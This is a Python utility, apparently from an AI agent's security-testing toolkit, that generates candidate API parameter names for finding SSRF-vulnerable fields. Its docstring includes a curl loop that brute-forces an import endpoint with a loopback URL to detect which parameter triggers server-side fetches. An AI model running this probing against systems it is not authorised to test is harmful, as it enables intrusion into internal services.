#!/usr/bin/env python3
"""Generate combined API parameter-name candidates (run-6661 a-14 lesson).

The a-14 SSRF parameter was `target_endpoint` — a prefix+noun COMPOUND.
One-word dictionaries never try it, so the agent burned 132 min. This tool
prints the cross product of prefixes x nouns in snake_case and camelCase,
with a curated seed list first so cheap common names are tried before the
long tail. Pure stdlib; runs identically on Windows dev and the hosted image.

Usage:
  python "$HEHUA_ROOT/scripts/paramgen.py"           # full list, one per line
  python "$HEHUA_ROOT/scripts/paramgen.py" --n 120   # first 120 candidates
  python "$HEHUA_ROOT/scripts/paramgen.py" --json    # JSON array

Wire it into a brute loop, e.g.:
  while read -r p; do
    curl -s -X POST "$URL/api/import" -H 'Content-Type: application/json' \
         -d "{\"$p\":\"http://127.0.0.1/\"}" | grep -qv "URL is required" \
      && echo "HIT param=$p"
  done < <(python "$HEHUA_ROOT/scripts/paramgen.py" --n 200)
"""
from __future__ import annotations

import argparse
import itertools
import json

# High-frequency single-word names: try these before anything compound.
SEEDS = [
    "url", "uri", "target", "endpoint", "link", "path", "host", "source",
    "dest", "dest_url", "callback", "webhook", "redirect", "redirect_uri",
    "redirect_url", "next", "return", "return_url", "goto", "site", "page",
    "fetch", "import", "sync", "api", "resource", "src", "href", "action",
    "ref", "from", "to", "out", "view", "load", "data", "file", "image",
    "img", "u", "r", "location",
]

# Compound = prefix + "_" + noun (snake) and prefix + Noun (camel).
PREFIXES = [
    "target", "dest", "destination", "remote", "source", "src", "import",
    "fetch", "sync", "partner", "api", "callback", "web", "my", "the",
    "external", "internal", "proxy", "forward", "redirect", "request",
    "image", "img", "file", "data", "user", "auth", "login", "next",
    "back", "return", "original", "ref", "server", "upstream", "backend",
]

NOUNS = [
    "url", "uri", "endpoint", "link", "path", "host", "addr", "address",
    "target", "source", "dest", "destination", "callback", "webhook",
    "redirect", "site", "page", "domain", "server", "api", "resource",
    "href", "location", "ref", "referrer", "origin", "image", "img",
    "file", "src", "to", "from", "next", "return", "out", "view", "load",
    "fetch", "sync", "import", "endpoint_url", "target_url",
]

def _dedupe(seq, seen):
    out = []
    for x in seq:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out


def snake(prefix: str, noun: str) -> str:
    return f"{prefix}_{noun}"


def camel(prefix: str, noun: str) -> str:
    return f"{prefix}{noun.capitalize()}"


def generate() -> list:
    """Seeds first, then the prefix x noun cross product (snake + camel).

    Idempotent: safe to call repeatedly (fresh dedupe set per call)."""
    seen: set = set()
    compounds = []
    for p, n in itertools.product(PREFIXES, NOUNS):
        if p == n:
            continue  # url_url is noise
        compounds.append(snake(p, n))
        compounds.append(camel(p, n))
    return _dedupe(SEEDS, seen) + _dedupe(compounds, seen)


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--n", type=int, default=0,
                    help="only print the first N candidates (0 = all)")
    ap.add_argument("--json", action="store_true", help="print a JSON array")
    args = ap.parse_args(argv)

    names = generate()
    if args.n > 0:
        names = names[: args.n]
    if args.json:
        print(json.dumps(names, ensure_ascii=False))
    else:
        for x in names:
            print(x)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
